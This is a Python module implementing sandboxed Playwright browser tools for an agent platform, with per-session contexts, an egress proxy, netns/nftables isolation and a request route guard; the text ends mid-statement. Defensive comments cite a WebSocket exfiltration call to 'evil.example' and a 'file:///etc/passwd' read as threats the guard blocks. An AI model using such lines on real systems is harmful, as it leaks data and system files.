"""Browser automation tools backed by Playwright (with mock fallback).

Architecture:
- When Playwright is importable, tools drive a real browser via a process-wide
  ``BrowserManager`` singleton (lazy launch, single page).
- When Playwright is *not* importable, every tool transparently falls back to
  an in-memory mock so zero-dependency environments (CI, unit tests) keep
  working without behaviour change.

All public tool functions return ``dict[str, Any]`` — the same contract as
every other tool module (the scheduler JSON-encodes the dict into a
``ToolResult``).

B2: every BrowserContext installs a Playwright ``context.route("**/*", ...)``
handler that runs the configured NetworkGuard's domain check on EVERY
request, redirect and subresource — not just the initial URL passed to
``browser_navigate``.  This closes the bypass where ``browser_click`` /
``browser_type(..., press_enter=True)`` / ``browser_evaluate`` /
``browser_file_upload`` could trigger navigation to a blocked domain because
they don't carry a ``url`` argument the broker could inspect.

H5: the context key is ``principal_id + session_id + runtime_id`` (not just
``principal_id``) with reference counting, so two concurrent local sessions
under the same UID get independent contexts and one session's
``RuntimeResult.aclose`` cannot close another session's page.

M1: ``browser_file_upload`` validates the file's identity (inode + size +
owner) at ``open()`` time, reads the bytes fully into memory, and hands
Playwright the bytes via its in-memory payload API
(``files=[{"name": ..., "mimeType": ..., "buffer": bytes}]``) — no temp
file is ever created, so there is no TOCTOU window for a same-UID process
to substitute different bytes between validation and upload.
"""

from __future__ import annotations

import asyncio
import base64
import logging
import os
import re
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Optional
from urllib.parse import urlparse

from khaos.security.browser_egress_proxy import BrowserEgressProxy
from khaos.security.browser_sandbox import BrowserNetworkSandbox

logger = logging.getLogger(__name__)

# ─── 尝试导入 Playwright ───
try:  # pragma: no cover - import success depends on the environment
    from playwright.async_api import (  # type: ignore[import-not-found]
        Browser,
        BrowserContext,
        Page,
        Request,
        Route,
        async_playwright,
    )

    _HAS_PLAYWRIGHT = True
except ImportError:
    _HAS_PLAYWRIGHT = False
    Browser = BrowserContext = Page = Request = Route = async_playwright = None  # type: ignore[assignment]
    logger.info("playwright not installed, browser tools will use mock fallback")


# ─── Mock 实现（保持向后兼容）───


@dataclass
class BrowserState:
    """In-memory browser state used by the mock fallback path."""

    url: str = "about:blank"
    typed: dict[str, str] = field(default_factory=dict)
    clicks: list[str] = field(default_factory=list)
    uploaded: list[tuple[str, str]] = field(default_factory=list)


_MOCK_STATE = BrowserState()


def reset_browser_state() -> None:
    """Reset mock browser state (primarily for tests)."""
    _MOCK_STATE.url = "about:blank"
    _MOCK_STATE.typed.clear()
    _MOCK_STATE.clicks.clear()
    _MOCK_STATE.uploaded.clear()


# ─── Playwright Browser Manager ───


class BrowserManager:
    """管理 Playwright 浏览器生命周期。进程级单例，延迟初始化。

    H1: supports per-principal ``BrowserContext`` isolation so different
    principals (users / subagents / webhook senders) do not share cookies,
    local storage or the current page.

    H5: the context key is ``principal_id + session_id + runtime_id`` (not
    just ``principal_id``) with reference counting.  Two concurrent local
    sessions under the same UID get independent contexts, and one session's
    ``RuntimeResult.aclose`` cannot close another session's page.  When
    multiple runtimes share a session (e.g. a subagent spawned within a
    chat turn), they share the context and the LAST release closes it.

    B2: every BrowserContext installs a Playwright ``context.route("**/*",
    ...)`` handler that runs the configured NetworkGuard's domain check on
    EVERY request, redirect and subresource — not just the initial URL.
    The guard is installed at context creation time and stays bound for
    the lifetime of the context.

    模块底部 ``_manager`` 是推荐的共享实例；``BrowserManager`` 本身也
    可被独立实例化（例如测试场景）。
    """

    def __init__(self):
        self._playwright = None
        self._browser: Optional[Browser] = None
        self._headless: bool = True
        self._browser_type: str = "chromium"  # chromium / firefox / webkit
        # H5: per-session context+page pairs with reference counting.
        # Keyed by ``f"{principal_id}:{session_id}:{runtime_id}"`` so two
        # concurrent local sessions under the same UID get independent
        # contexts.  Each entry is a dict with "context", "page", "refcount"
        # and "network_guard" keys.
        self._contexts: dict[str, dict[str, Any]] = {}
        # H2: when ``ensure_page`` returns ``None`` because the route guard
        # failed to install, the failure reason is stashed here so
        # ``_safe_execute`` can surface it instead of the generic
        # "Browser not available" message.  Reset on every ``ensure_page``
        # call so a transient failure doesn't poison subsequent calls.
        self._last_ensure_error: str = ""
        # M2: one lifecycle lock serializes process-wide Playwright/Browser/
        # context-map mutation.  A previous per-key lock table never evicted
        # keys and grew for the lifetime of the server.
        self._lifecycle_lock = asyncio.Lock()
        self._context_close_failures: dict[str, int] = {}
        # H1 (round-3): the close lifecycle is now a 3-state machine so
        # that a FAILED first close can be retried instead of falsely
        # reporting success on the second call:
        #
        #   _closing_requested — set the moment ``close()`` begins.
        #     Permanently blocks ``launch``/``ensure_page`` (no new
        #     browser generation can start once teardown is requested).
        #     Never cleared.
        #   _closed — set ONLY after every owned resource (contexts,
        #     browser, playwright) has terminated cleanly.  Idempotent
        #     close() short-circuits to ``{ok: True}`` only when this is
        #     set.  Without a successful teardown, the next close() MUST
        #     keep retrying.
        #   _close_failed — set when the previous close attempt raised.
        #     Lets ``launch``/``ensure_page`` keep rejecting (because
        #     _closing_requested stays True) while ``close`` keeps
        #     retrying until resources actually terminate.
        #
        # The previous single-flag ``_closed`` was set BEFORE the
        # teardown attempts, so a failure left it permanently True —
        # the next close() saw ``_closed`` and returned ``{ok: True}``
        # without retrying, defeating AgentService.shutdown's fail-closed
        # gate on the browser result.
        self._closing_requested: bool = False
        self._closed: bool = False
        self._close_failed: bool = False
        # F-05: OS-level browser egress enforcement (Linux netns + cgroup).
        # Set up once when the browser launches; torn down in close().
        # On non-Linux or without CAP_NET_ADMIN, this stays inactive and
        # the proxy-only enforcement layer remains the sole authority.
        self._browser_sandbox: BrowserNetworkSandbox | None = None

    @property
    def is_ready(self) -> bool:
        """Playwright 是否已初始化且可用（至少有一个活跃 page）。"""
        return any(entry.get("page") is not None for entry in self._contexts.values())

    @property
    def current_url(self) -> str:
        """当前默认页面 URL（无 page 时回退到 mock 状态）。"""
        # H5: pick any context's page — backward-compat for callers that
        # don't specify a session.
        for entry in self._contexts.values():
            if entry.get("page"):
                try:
                    return entry["page"].url
                except Exception:  # noqa: BLE001 — page may be torn down
                    pass
        return _MOCK_STATE.url

    async def launch(
        self, headless: bool = True, browser_type: str = "chromium"
    ) -> dict[str, Any]:
        """Start the process browser under the singleton lifecycle lock."""
        # H1: the closed-state check happens INSIDE the lock (in
        # ``_launch_locked``) so a concurrent ``close()`` cannot slip a
        # ``_closed=True`` between the check and lock acquisition.  Checking
        # outside the lock was a TOCTOU race: ``ensure_page`` could pass the
        # check, then ``close`` runs and tears the browser down, then
        # ``ensure_page`` acquires the lock and relaunches via
        # ``_launch_locked`` which previously had no closed-state guard.
        async with self._lifecycle_lock:
            return await self._launch_locked(headless, browser_type)

    async def _launch_locked(
        self, headless: bool = True, browser_type: str = "chromium"
    ) -> dict[str, Any]:
        """启动浏览器。

        Returns:
            ``{"ok": True, "browser_type": ..., "headless": ...}`` 成功；
            ``{"ok": False, "error": "..."}`` 失败（Playwright 缺失或启动报错）。

        H1 (round-3): the closed-state check uses ``_closing_requested`` so
        it rejects new launches the moment teardown begins — even when the
        previous close() attempt FAILED (``_closed`` stays False on
        failure, but ``_closing_requested`` is permanent).  This is the
        deepest chokepoint: every launch path — ``launch()``,
        ``ensure_page()``'s lazy restart, any future caller — is gated
        regardless of whether the outer caller remembered to check.  Must
        be called under ``_lifecycle_lock`` so the check cannot race a
        concurrent ``close()``.
        """
        if self._closing_requested:
            return {
                "ok": False,
                "error": "browser manager is permanently closed",
            }
        if not _HAS_PLAYWRIGHT:
            return {
                "ok": False,
                "error": (
                    "playwright not installed. Install with: "
                    "pip install playwright && playwright install chromium"
                ),
            }
        try:
            if (
                self._browser is not None
                and self._headless == headless
                and self._browser_type == browser_type
            ):
                return {
                    "ok": True,
                    "browser_type": browser_type,
                    "headless": headless,
                }
            # Close the old generation before launching a replacement.  A
            # failed Context close retains ownership and aborts the switch.
            await self._close_all_contexts()
            if self._browser is not None:
                await self._browser.close()
                self._browser = None
            self._headless = headless
            self._browser_type = browser_type
            if self._playwright is None:
                self._playwright = await async_playwright().start()
            pw = self._playwright
            # C-04 (round-5): production defaults to fail-closed.
            # Only KHAOS_BROWSER_DEV_MODE=1 allows proxy-only fallback.
            _dev_mode = os.environ.get("KHAOS_BROWSER_DEV_MODE", "") == "1"
            # F-05: set up the OS-level netns sandbox before launching
            # Chromium.  On Linux with CAP_NET_ADMIN, this creates a
            # dedicated network namespace with no default route so even
            # a compromised browser cannot bypass the egress proxy.  On
            # non-Linux, it's a no-op and the proxy-only layer remains.
            if self._browser_sandbox is None:
                # Round-4 review Batch 4 (§13.3): reap stale netns/veth/
                # cgroup/nft resources from a previous boot before creating
                # new ones.  Best-effort — failures are logged.
                # Round-5 Batch 5.4: run in a thread — startup_reaper()
                # invokes subprocess.run (ip/nft/cgroup file I/O) which
                # would block the event loop.
                await asyncio.to_thread(BrowserNetworkSandbox.startup_reaper)
                self._browser_sandbox = BrowserNetworkSandbox(
                    require_os_sandbox=not _dev_mode,
                )
                # Round-5 Batch 5.4: setup() invokes subprocess.run
                # (ip netns add, ip link add, nft -f -, cgroup mkdir)
                # which blocks the event loop — run off-loop.
                await asyncio.to_thread(self._browser_sandbox.setup)
            if browser_type == "firefox":
                # C-04 (round-5): Firefox does not use the netns wrapper.
                # In production, refuse to launch Firefox without the OS
                # sandbox.  In dev mode, log a warning and continue.
                if self._browser_sandbox.is_active:
                    from khaos.security.browser_sandbox import BrowserSandboxError
                    if not _dev_mode:
                        raise BrowserSandboxError(
                            "Firefox does not support netns wrapper — "
                            "refusing to launch in production.  Set "
                            "KHAOS_BROWSER_DEV_MODE=1 for dev/testing."
                        )
                    logger.warning(
                        "browser sandbox: Firefox launched WITHOUT netns "
                        "wrapper — only proxy-level enforcement applies"
                    )
                browser = await pw.firefox.launch(headless=headless)
            elif browser_type == "webkit":
                # C-04 (round-5): WebKit does not use the netns wrapper.
                if self._browser_sandbox.is_active:
                    from khaos.security.browser_sandbox import BrowserSandboxError
                    if not _dev_mode:
                        raise BrowserSandboxError(
                            "WebKit does not support netns wrapper — "
                            "refusing to launch in production.  Set "
                            "KHAOS_BROWSER_DEV_MODE=1 for dev/testing."
                        )
                    logger.warning(
                        "browser sandbox: WebKit launched WITHOUT netns "
                        "wrapper — only proxy-level enforcement applies"
                    )
                browser = await pw.webkit.launch(headless=headless)
            else:
                # F-05: if the netns sandbox is active, wrap the Chromium
                # binary so it launches inside the dedicated namespace.
                launch_kwargs: dict[str, Any] = {
                    "headless": headless,
                    "args": [
                        "--disable-background-networking",
                        "--disable-component-update",
                        "--disable-domain-reliability",
                        # F-05 (third-round review §5.3): do NOT add the
                        # network service sandbox to the disable list.
                        # Keeping Chromium's network service sandboxed
                        # limits the in-process attack surface if a
                        # renderer compromise occurs.
                        "--disable-features=WebRtcHideLocalIpsWithMdns",
                        "--disable-quic",
                        "--force-webrtc-ip-handling-policy=disable_non_proxied_udp",
                        "--webrtc-ip-handling-policy=disable_non_proxied_udp",
                    ],
                }
                if self._browser_sandbox.is_active:
                    # C-04 (round-5): wrapper creation failure is fatal in
                    # production.  No more silent fallback to direct launch.
                    real_path = pw.chromium.executable_path
                    if real_path:
                        # create_wrapper_script raises BrowserSandboxError
                        # in production mode if the run dir is missing.
                        wrapper = self._browser_sandbox.create_wrapper_script(
                            real_path, 0,  # port is per-context
                        )
                        if wrapper:
                            launch_kwargs["executable_path"] = wrapper
                            logger.info(
                                "browser netns sandbox: launching "
                                "Chromium inside netns %s",
                                self._browser_sandbox._netns_name,
                            )
                        elif not _dev_mode:
                            # Sandbox is active but wrapper is None —
                            # this shouldn't happen, but fail closed.
                            from khaos.security.browser_sandbox import BrowserSandboxError
                            raise BrowserSandboxError(
                                "wrapper script creation returned None "
                                "in production mode — refusing direct launch"
                            )
                browser = await pw.chromium.launch(**launch_kwargs)
            self._browser = browser
            logger.info("Browser launched: %s (headless=%s)", browser_type, headless)
            # C-09: include structured enforcement status in the result
            # so callers can verify which layers are active and refuse to
            # proceed when a required layer is missing.
            status = self._browser_sandbox.enforcement_status
            return {
                "ok": True,
                "browser_type": browser_type,
                "headless": headless,
                "enforcement": {
                    "network_namespace": status.network_namespace,
                    "proxy_required": status.proxy_required,
                    "cgroup": status.cgroup,
                    "route_guard": status.route_guard,
                    "service_workers_blocked": status.service_workers_blocked,
                },
            }
        except Exception as exc:  # noqa: BLE001 — surfaced as error dict
            logger.error("Failed to launch browser: %s", exc)
            return {"ok": False, "error": str(exc)}

    async def _close_all_contexts(self) -> None:
        """Close every owned context, propagating the first failure."""
        for key in list(self._contexts.keys()):
            await self._close_one_context(key, force=True)

    async def _close_one_context(self, key: str, *, force: bool = False) -> None:
        """Decrement refcount and close the context when it reaches zero.

        H5: ``force=True`` ignores the refcount (used by ``close`` /
        ``_close_all_contexts`` during teardown).
        """
        entry = self._contexts.get(key)
        if entry is None:
            return
        if not force:
            entry["refcount"] = max(0, int(entry.get("refcount", 0)) - 1)
            if entry["refcount"] > 0:
                # Still in use by another runtime — do NOT close.
                return
        ctx = entry.get("context")
        if ctx is not None:
            try:
                await ctx.close()
            except Exception:
                if not force:
                    entry["refcount"] = max(1, int(entry.get("refcount", 0)))
                self._context_close_failures[key] = (
                    self._context_close_failures.get(key, 0) + 1
                )
                raise
        proxy = entry.get("egress_proxy")
        if proxy is not None:
            await proxy.close()
        # Round-6 Batch 6.2 (§六): remove this context's egress port
        # from the per-sandbox nftables port set and atomically
        # re-apply the table.  This ensures the kernel policy no longer
        # allows traffic to a proxy that has just been shut down, while
        # PRESERVING other contexts' ports (the previous ``flush table``
        # design silently dropped them).
        egress_port = entry.get("egress_port")
        if (
            egress_port is not None
            and self._browser_sandbox is not None
            and self._browser_sandbox.is_active
        ):
            try:
                # Round-5 Batch 5.4: remove_egress_port() invokes
                # subprocess.run (nft -c -f - + nft -f -) which blocks
                # the event loop — run off-loop.
                await asyncio.to_thread(
                    self._browser_sandbox.remove_egress_port, egress_port
                )
            except Exception as exc:  # noqa: BLE001 — best-effort cleanup
                logger.warning(
                    "remove_egress_port(%s) failed during context close: %s",
                    egress_port, exc,
                )
        self._contexts.pop(key, None)
        self._context_close_failures.pop(key, None)

    async def close_context(
        self,
        principal_id: str,
        *,
        session_id: str = "",
        runtime_id: str = "",
    ) -> dict[str, Any]:
        """Release one session's BrowserContext (H1, H5).

        Decrements the refcount; the context is only closed when the last
        runtime sharing it releases.  Called by ``RuntimeResult.aclose`` so
        a runtime's cookies / DOM / page are released when it ends — but
        a concurrent runtime sharing the same session is NOT affected.

        Note: this API guesses a single context key from
        ``principal_id`` + ``session_id`` + ``runtime_id``.  If a runtime
        acquired contexts under multiple keys (e.g. by calling
        ``ensure_page`` with different ``session_id``s),
        ``close_context`` only releases ONE of them — the rest leak.
        ``close_runtime(runtime_id)`` is the robust alternative and is
        what ``RuntimeResult._run_close`` now calls.
        """
        key = self._context_key(principal_id, session_id, runtime_id)
        async with self._lifecycle_lock:
            await self._close_one_context(key, force=False)
        return {"ok": True, "principal_id": principal_id or "default"}

    async def close_runtime(self, runtime_id: str) -> dict[str, Any]:
        """H1 (lifecycle): close ALL contexts owned by ``runtime_id``.

        More robust than ``close_context`` which guesses a single key.
        When a runtime calls ``ensure_page`` (potentially under multiple
        principal / session keys), every context it acquired lists
        ``runtime_id`` in its ``_runtime_owners`` set.  This method
        iterates every entry, discards ``runtime_id`` from the owner set
        and decrements the refcount; the context is only closed when the
        refcount reaches zero (so a concurrent runtime sharing the same
        context is NOT affected).

        Called by ``RuntimeResult._run_close`` so a runtime's cookies /
        DOM / page state cannot leak into a subsequent run by a different
        runtime sharing the same process-wide ``BrowserManager`` —
        regardless of which (principal, session, runtime) key the
        context was originally acquired under.
        """
        if not runtime_id:
            # Nothing to do — callers without a runtime_id never bumped
            # any refcount (see ``ensure_page``: empty runtime_id records
            # an empty ``_runtime_owners`` set on context creation).
            return {"ok": True, "runtime_id": runtime_id or "default"}
        async with self._lifecycle_lock:
            for key in list(self._contexts.keys()):
                entry = self._contexts.get(key)
                if entry is None:
                    continue
                owners = entry.get("_runtime_owners", set())
                if runtime_id not in owners:
                    continue
                if int(entry.get("refcount", 0)) > 1:
                    owners.discard(runtime_id)
                    entry["refcount"] = int(entry["refcount"]) - 1
                    continue
                # Last owner: retain the owner/ref until ctx.close succeeds.
                try:
                    await self._close_one_context(key, force=True)
                except Exception:
                    failures = self._context_close_failures.get(key, 0)
                    if failures >= 3 and self._browser is not None:
                        await self._force_close_browser_locked()
                        return {
                            "ok": True,
                            "runtime_id": runtime_id,
                            "forced_browser_close": True,
                        }
                    raise
        return {"ok": True, "runtime_id": runtime_id}

    async def _force_close_browser_locked(self) -> None:
        """Force the browser generation closed after repeated Context failure."""
        if self._browser is not None:
            await self._browser.close()
        if self._playwright is not None:
            await self._playwright.stop()
        self._browser = None
        self._playwright = None
        self._contexts.clear()
        self._context_close_failures.clear()

    @staticmethod
    def _context_key(
        principal_id: str, session_id: str, runtime_id: str
    ) -> str:
        """H5: derive the per-session context key.

        Empty ``session_id`` / ``runtime_id`` collapse to ``"default"``
        for backward compatibility with callers (e.g. tests) that don't
        pass them.  Production callers (the capability broker / runtime
        factory) always pass non-empty values so two concurrent sessions
        under the same UID get independent contexts.
        """
        p = principal_id or "default"
        s = session_id or "default"
        r = runtime_id or "default"
        return f"{p}:{s}:{r}"

    async def close(self) -> dict[str, Any]:
        """关闭浏览器和 Playwright runtime（幂等且可重试）。

        H1 (round-3): the close state is now a 3-state machine so a failed
        first close can be retried instead of falsely reporting success
        on the next call:

        * ``_closing_requested`` is set the moment close() begins and never
          cleared — ``launch``/``ensure_page`` permanently reject new
          work after this.
        * ``_closed`` is set ONLY after every owned resource has terminated
          cleanly.  The idempotent ``{ok: True}`` short-circuit fires only
          when this is set.  A failed close does NOT set ``_closed``, so
          the next close() actually retries.
        * ``_close_failed`` records the previous failure so the manager
          stays closed-for-launch while still permitting close() retries.

        All state reads/writes are inside ``_lifecycle_lock`` so the
        state transitions are atomic with respect to launch/ensure_page.
        """
        async with self._lifecycle_lock:
            # Idempotent: once every resource has terminated cleanly, a
            # subsequent close() is a no-op success.  This short-circuit
            # fires ONLY on full success — a failed previous attempt
            # (``_close_failed``) keeps ``_closed`` False so the caller
            # can observe and retry.
            if self._closed:
                return {"ok": True}
            # Mark teardown-in-progress so launch/ensure_page reject new
            # work from this point on.  Never cleared, even on failure —
            # a half-torn-down manager must not serve new pages.
            self._closing_requested = True
            self._close_failed = False
            try:
                await self._close_all_contexts()
                if self._browser:
                    await self._browser.close()
                if self._playwright:
                    await self._playwright.stop()
                self._browser = None
                self._playwright = None
                self._context_close_failures.clear()
                # F-05: tear down the OS-level netns sandbox (Linux only).
                # Best-effort: a failure here must not prevent ``_closed``
                # from being set, since the browser and playwright are
                # already stopped.
                if self._browser_sandbox is not None:
                    try:
                        # Round-5 Batch 5.4: teardown() invokes
                        # subprocess.run (nft delete, ip link del, ip
                        # netns del) and cgroup file I/O which blocks
                        # the event loop — run off-loop.
                        await asyncio.to_thread(self._browser_sandbox.teardown)
                    except Exception as exc:  # noqa: BLE001
                        logger.warning(
                            "browser netns sandbox teardown failed: %s", exc,
                        )
                    self._browser_sandbox = None
                # All resources terminated cleanly — only now is the
                # manager truly closed.  The idempotent short-circuit
                # above will fire on subsequent calls.
                self._closed = True
                return {"ok": True}
            except Exception as exc:  # noqa: BLE001 — surfaced as error dict
                # Teardown failed: do NOT set ``_closed``.  The next
                # close() call must retry the residual resources instead
                # of short-circuiting to success.  ``_closing_requested``
                # stays True so no new browser generation starts.
                self._close_failed = True
                logger.error("Failed to close browser: %s", exc)
                return {"ok": False, "error": str(exc)}

    async def ensure_page(
        self,
        principal_id: str = "",
        *,
        session_id: str = "",
        runtime_id: str = "",
        network_guard: Any = None,
    ) -> Optional[Page]:
        """确保浏览器已启动，未启动则自动启动（chromium, headless）。

        H1: returns the ``Page`` for ``principal_id``'s dedicated
        ``BrowserContext``.  Different principals get isolated contexts
        (cookies, local storage, current page) so one principal cannot
        observe another's browser state.

        H5: the context key also includes ``session_id`` and
        ``runtime_id`` so two concurrent local sessions under the same UID
        get independent contexts.  ``refcount`` tracks how many runtimes
        share a context; ``close_context`` only closes when the last
        runtime releases.

        H1 (lifecycle): refcount must only bump for NEW runtimes, not
        every tool call.  A sequence of ``browser_navigate`` /
        ``browser_snapshot`` / ``browser_click`` under the SAME
        ``runtime_id`` returns the page WITHOUT bumping refcount; only a
        NEW ``runtime_id`` sharing the context bumps refcount and is
        recorded in ``_runtime_owners`` so ``close_runtime`` can release
        it.  Without this, every tool call bumped refcount but
        ``RuntimeResult.aclose`` only decremented once, leaking
        BrowserContexts / pages / cookies / DOM state.

        B2: when ``network_guard`` is supplied, a Playwright
        ``context.route("**/*", ...)`` handler is installed that runs the
        guard's domain check on EVERY request, redirect and subresource —
        not just the initial URL passed to ``browser_navigate``.

        H2: if the route guard fails to install, the context is closed
        immediately and ``None`` is returned — never continue with an
        unguarded context (the route guard is the only thing preventing
        subsequent click / type / evaluate / upload from reaching a
        blocked domain).
        """
        # The process-wide lifecycle lock coalesces concurrent first use and
        # avoids an unbounded per-key lock registry.
        # H1: the closed-state check happens INSIDE the lock (in
        # ``_ensure_page_locked``) so a concurrent ``close()`` cannot slip
        # a ``_closed=True`` between the check and lock acquisition.
        self._last_ensure_error = ""
        key = self._context_key(principal_id, session_id, runtime_id)
        async with self._lifecycle_lock:
            return await self._ensure_page_locked(
                key,
                runtime_id=runtime_id,
                network_guard=network_guard,
            )

    async def _ensure_page_locked(
        self,
        key: str,
        *,
        runtime_id: str,
        network_guard: Any,
    ) -> Optional[Page]:
        """Create or reuse a page while ``_lifecycle_lock`` is held.

        H1 (round-3): the closed-state check uses ``_closing_requested``
        so a half-torn-down manager (first close failed) still rejects
        new pages while a retry is pending — without relying on the
        failure-only ``_closed`` flag.  Inside the lock so the check
        cannot race a concurrent ``close()``.
        """
        if self._closing_requested:
            self._last_ensure_error = "browser manager is permanently closed"
            return None
        entry = self._contexts.get(key)
        if entry is not None and entry.get("page") is not None:
            # H1 (lifecycle): only bump refcount for a NEW runtime_id.
            # The SAME runtime_id re-entering (e.g. navigate → snapshot →
            # click within one runtime) returns the page WITHOUT bumping,
            # so ``close_runtime(runtime_id)`` decrementing once actually
            # releases the context.
            owners = entry.setdefault("_runtime_owners", set())
            if runtime_id in owners:
                return entry["page"]
            owners.add(runtime_id)
            entry["refcount"] = int(entry.get("refcount", 0)) + 1
            return entry["page"]
        # Need to create a new context for this session.
        if self._browser is None:
            result = await self._launch_locked()
            if not result.get("ok"):
                return None
        if self._browser is None:
            return None
        guard_supplied = network_guard is not None
        if network_guard is None:
            from khaos.security.network_guard import NetworkGuard

            network_guard = NetworkGuard(
                network_enabled=False, allowed_domains=[],
            )
        # F-05: when the OS-level netns sandbox is active, bind the proxy
        # to the veth host IP so it's reachable from inside the browser
        # network namespace.  Otherwise, bind to loopback only.
        proxy_bind_host = (
            self._browser_sandbox.proxy_bind_host
            if self._browser_sandbox is not None
            else "127.0.0.1"
        )
        egress_proxy = BrowserEgressProxy(network_guard, bind_host=proxy_bind_host)
        try:
            await egress_proxy.start()
            # C-06: install nftables egress pin so the browser veth can
            # reach ONLY the exact proxy IP:port.  Must be called AFTER
            # the proxy has started (dynamic port).  When the sandbox is
            # not active (non-Linux / dev mode), this is a no-op.
            # Round-6 Batch 6.2 (§六): ``install_egress_pin`` now ADDS
            # the port to a per-sandbox ``_egress_ports`` set (instead
            # of ``flush``-ing the whole table).  The matching
            # ``remove_egress_port`` is called by ``_close_one_context``.
            proxy_port: int | None = None
            if (
                self._browser_sandbox is not None
                and self._browser_sandbox.is_active
            ):
                proxy_port = int(
                    egress_proxy.server_url.rsplit(":", 1)[1]
                )
                # Round-5 Batch 5.4: install_egress_pin() invokes
                # subprocess.run (nft -f -) which blocks the event
                # loop — run off-loop.
                await asyncio.to_thread(
                    self._browser_sandbox.install_egress_pin, proxy_port
                )
            # F-05: when the netns sandbox is active, the browser reaches
            # the proxy via the veth host IP.  The ``bypass`` list must
            # NOT include ``<-loopback>`` in that case because the proxy
            # is not on loopback — it's on the veth interface.
            bypass = "" if proxy_bind_host != "127.0.0.1" else "<-loopback>"
            # C-07: pass per-proxy credentials so only the intended
            # browser context can relay traffic.  Without this, any host
            # process that can reach the bind address could use the proxy.
            context = await self._browser.new_context(
                viewport={"width": 1280, "height": 720},
                user_agent="KhaosBrowser/1.0",
                proxy={
                    "server": egress_proxy.server_url,
                    "username": egress_proxy.proxy_username,
                    "password": egress_proxy.proxy_password,
                    "bypass": bypass,
                },
                # Service workers would add another request authority.
                service_workers="block",
            )
        except Exception:
            await egress_proxy.close()
            raise
        # B2: install the route interceptor BEFORE creating the page so the
        # very first navigation is gated.  The interceptor runs the
        # NetworkGuard's domain check on every request, redirect and
        # subresource — closing the bypass where browser_click / type /
        # evaluate / upload could reach a blocked domain because they
        # don't carry a ``url`` argument the broker could inspect.
        # H2: if installation fails, close the context immediately and
        # return None — never continue with an unguarded context.  The
        # caller (``_safe_execute``) translates ``None`` into
        # ``{"ok": False, "error": "Browser security guard installation failed"}``.
        if guard_supplied:
            try:
                await self._install_route_guard(context, network_guard)
            except Exception as exc:  # noqa: BLE001 — surfaced as None
                logger.error(
                    "B2 route guard installation failed; closing context: %s",
                    exc,
                )
                try:
                    await context.close()
                except Exception:  # noqa: BLE001 — best-effort cleanup
                    pass
                await egress_proxy.close()
                # H2: stash the specific failure reason so ``_safe_execute``
                # can surface it instead of the generic "Browser not
                # available" message.
                self._last_ensure_error = (
                    "Browser security guard installation failed"
                )
                return None
        page = await context.new_page()
        page.set_default_timeout(30000)  # 30s default
        self._contexts[key] = {
            "context": context,
            "page": page,
            "refcount": 1,
            "network_guard": network_guard,
            "egress_proxy": egress_proxy,
            # Round-6 Batch 6.2 (§六): record the kernel-allowed egress
            # port so ``_close_one_context`` can call
            # ``remove_egress_port`` and atomically rebuild the nft
            # table WITHOUT this port.  ``None`` when the OS sandbox is
            # not active (non-Linux / dev mode).
            "egress_port": proxy_port,
            # H1 (lifecycle): track which runtime_ids have acquired this
            # context so ``ensure_page`` only bumps refcount for NEW
            # runtimes, and ``close_runtime`` can release ALL contexts a
            # runtime owns (across principals / sessions).
            "_runtime_owners": {runtime_id} if runtime_id else set(),
        }
        logger.info("Browser context created for session: %s", key)
        return page

    async def _install_route_guard(self, context: Any, guard: Any) -> None:
        """B2: install ``context.route("**/*", ...)`` to enforce the
        NetworkGuard's domain check on every request, redirect and
        subresource.

        The handler extracts the request URL's domain, runs the guard's
        ``_check_domain`` (which already implements the blocked > allowed
        > network_enabled priority), and either continues or aborts the
        request.  ``context.route`` covers main-frame navigations,
        redirects, iframes, fetch/XHR, images, scripts, stylesheets —
        everything Playwright sees.

        H2: this method MUST NOT catch exceptions from
        ``context.route(...)`` — if route registration fails, the
        exception propagates to ``ensure_page`` which closes the
        context immediately and returns ``None``.  Continuing with an
        unguarded context would let subsequent click / type / evaluate /
        upload operations bypass the domain allowlist.

        H2: the handler also restricts the URL scheme.  Only ``http``,
        ``https``, ``about:blank``, ``blob:`` and ``data:`` are allowed;
        ``file:`` and custom / unknown schemes are aborted
        ``blockedbyclient`` so the page cannot reach local files or
        exotic transports the NetworkGuard's domain check does not
        understand.
        """
        # H2: allowed URL schemes.  ``about:blank`` is matched explicitly
        # below because ``urlparse("about:blank").scheme`` returns
        # ``"about"`` (not in the set) but it is a safe non-network
        # placeholder that pages can navigate to freely.
        _ALLOWED_SCHEMES = frozenset({"http", "https", "blob", "data"})

        async def _route_handler(route: "Route", request: "Request") -> None:
            try:
                url = request.url
                # H2: scheme allowlist.  ``file:`` and custom / unknown
                # schemes are rejected before the domain check runs —
                # ``file:///etc/passwd`` has no domain so the domain
                # check would pass it through, and custom schemes
                # (``chrome-extension://``, ``javascript:``, ...) bypass
                # the NetworkGuard entirely.
                lower_url = url.lower()
                if (
                    lower_url == "about:blank"
                    or lower_url.startswith("about:blank")
                ):
                    await route.continue_()
                    return
                parsed = urlparse(url)
                scheme = (parsed.scheme or "").lower()
                if scheme not in _ALLOWED_SCHEMES:
                    await route.abort("blockedbyclient")
                    logger.info(
                        "B2 route guard blocked request with disallowed "
                        "scheme %r: %s",
                        scheme or "<empty>", url,
                    )
                    return
                domain = parsed.hostname or ""
                if domain:
                    # Resolve every browser request before Chromium handles
                    # it.  This extends the domain policy to A/AAAA targets
                    # and rejects localhost/private/metadata rebinding.
                    result = await guard.check_resolved_url(url)
                    if not result.allowed:
                        await route.abort("blockedbyclient")
                        logger.info(
                            "B2 route guard blocked request to %s: %s",
                            domain, result.reason,
                        )
                        return
                await route.continue_()
            except Exception as exc:  # noqa: BLE001 — never let the
                # handler raise into Playwright (it would crash the page).
                logger.warning("B2 route guard error: %s", exc)
                # Fail closed: abort on handler error.
                try:
                    await route.abort("failed")
                except Exception:  # noqa: BLE001
                    pass

        # H2: do NOT catch exceptions — if ``context.route(...)`` fails
        # to register the handler, the exception propagates to
        # ``ensure_page`` which closes the context immediately and
        # returns None.  Never continue with an unguarded context.
        await context.route("**/*", _route_handler)

        # B2: WebSocket bypass closure.  ``context.route()`` does NOT
        # intercept WebSocket connections — a page could open
        # ``new WebSocket("wss://evil.example/leak")`` to exfiltrate data
        # past the HTTP route guard.  ``route_web_socket()`` (Playwright
        # >=1.48) registers a separate handler for WebSocket upgrades so
        # the same domain allowlist applies.  We probe for the method
        # at runtime so older Playwright builds fail closed with a clear
        # error instead of silently allowing WebSockets.
        #
        # NOTE: ``route_web_socket``'s handler signature is
        # ``(websocket_route)`` — NOT ``(route, request)`` like
        # ``context.route()``.  The ``WebSocketRoute`` object exposes
        # ``.url``, ``.close()`` and ``.connect_to_server()``.
        if not hasattr(context, "route_web_socket"):
